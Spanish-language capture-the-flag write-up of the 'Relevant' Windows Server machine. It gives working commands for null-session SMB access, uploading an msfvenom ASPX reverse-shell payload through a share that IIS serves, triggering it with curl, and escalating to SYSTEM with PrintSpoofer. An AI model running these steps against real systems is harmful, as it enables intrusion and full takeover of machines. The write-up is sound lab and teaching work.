# Relevant

Conceptos clave: SMB Null Session, Data Exposure (Base64), SMB-to-Web Mapping, Misconfigured IIS, MSFVenom (ASPX Payload), Windows Token Impersonation (SeImpersonatePrivilege), PrintSpoofer
Dificultad: Media
Fecha: 27 de junio de 2026

## Resumen
Compromiso de la máquina **Relevant** (Windows Server) explotando una grave vulnerabilidad de arquitectura que interconectaba servicios de almacenamiento e interfaces web. La enumeración inicial por SMB con sesión nula permitió acceder a un recurso compartido (`nt4wrksv`) que contenía credenciales ofuscadas en Base64. Al descubrir que este mismo recurso compartido estaba siendo servido públicamente por un servidor IIS en un puerto no estándar (49663), se subió un *payload* reverso en formato `.aspx` mediante SMB y se ejecutó vía web para obtener acceso inicial. Finalmente, abusando del privilegio `SeImpersonatePrivilege` inherente a la cuenta de servicio web, se ejecutó `PrintSpoofer64.exe` para elevar privilegios a `NT AUTHORITY\SYSTEM`.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos y Servicios
Se inició la auditoría mapeando todos los puertos TCP expuestos y extrayendo las versiones de los servicios subyacentes:

```bash
nmap -p- --open --min-rate 5000 -n -sS -Pn <IP>
nmap -p 80,135,139,445,3389,49663,49666,49667 -sC -sV <IP>
```

**Hallazgos relevantes:**
* `80/tcp`: HTTP (IIS 10.0).
* `139/tcp`, `445/tcp`: SMB.
* `3389/tcp`: RDP.
* `49663/tcp`: HTTP (IIS 10.0 en puerto no estándar).

### 1.2 Enumeración SMB (Null Session)
Sabiendo que SMB estaba abierto, se intentó listar los recursos compartidos sin credenciales (sesión nula):

```bash
smbclient -L //<IP> -N
```
El servidor devolvió los recursos por defecto (`ADMIN$`, `C$`, `IPC$`) y un recurso personalizado inusual llamado `nt4wrksv`. 

Se accedió a este recurso y se procedió a listar su contenido:
```bash
smbclient //<IP>/nt4wrksv -N
smb: \> dir
smb: \> get passwords.txt
```
El archivo extraído contenía credenciales codificadas en **Base64**. Tras su decodificación (`cat passwords.txt | base64 -d`), se revelaron dos pares de credenciales (Bob y Bill). No obstante, estos usuarios no contaban con permisos de acceso válidos para RDP ni para otros recursos críticos.

---

## 2. Acceso Inicial (Initial Access)

### 2.1 Identificación de SMB-to-Web Mapping
Se procedió a auditar el servidor web alojado en el puerto `49663`. Al navegar por él no se encontraron directorios evidentes. Sin embargo, se intuyó un posible fallo de arquitectura: el mapeo de directorios físicos de IIS a recursos compartidos.

Para verificarlo, se navegó a `http://<IP>:49663/nt4wrksv/passwords.txt`. El archivo se mostró en el navegador, confirmando que **todo lo subido vía SMB era directamente ejecutable y accesible vía web**.

### 2.2 Creación de Payload (MSFVenom) y Explotación
Aprovechando que el servidor web ejecuta tecnología ASP.NET (IIS), se generó un *payload* de *reverse shell* de 64 bits en formato `.aspx`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_VPN> LPORT=4444 -f aspx -o shell.aspx
```

1. **Subida del Payload:** Se volvió a conectar al recurso SMB con sesión nula y se subió el archivo malicioso mediante el comando `put shell.aspx`.
2. **Ejecución:** Con un *listener* activo (`nc -nlvp 4444`), se realizó una petición HTTP (`curl`) para detonar el *payload*:

```bash
curl http://<IP>:49663/nt4wrksv/shell.aspx
```

**Resultado:** Se obtuvo una *shell* interactiva bajo el contexto de la cuenta de servicio `iis apppool\defaultapppool`. Se procedió a leer la primera bandera (`user.txt`).

---

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de Privilegios Locales
Al tratarse de una cuenta de servicio IIS, el primer vector a comprobar fue la asignación de privilegios especiales en el *token* de acceso del usuario:

```cmd
whoami /priv
```
**Hallazgo crítico:** El privilegio **`SeImpersonatePrivilege`** (Impersonate a client after authentication) estaba habilitado. Este privilegio es susceptible a ataques de suplantación de *tokens* locales.

### 3.2 Explotación (PrintSpoofer)
Para abusar de este privilegio en sistemas Windows Server 2016/2019, la herramienta estándar de la industria es `PrintSpoofer`.

1. Se descargó el binario `PrintSpoofer64.exe` en la máquina atacante.
2. Utilizando la misma vulnerabilidad de diseño (SMB-to-Web mapping), se subió `PrintSpoofer64.exe` al directorio `nt4wrksv` vía `smbclient`.
3. Desde la *reverse shell*, se ejecutó el binario solicitando la apertura de una consola interactiva (`-i`) con el comando `cmd`:

```cmd
cd c:\inetpub\wwwroot\nt4wrksv
PrintSpoofer64.exe -i -c cmd
```

**Resultado:** La herramienta suplantó con éxito el *token* del sistema, devolviendo un *prompt* interactivo como **`NT AUTHORITY\SYSTEM`**. Se logró el compromiso total del dominio/máquina y se recuperó la bandera final (`root.txt`).
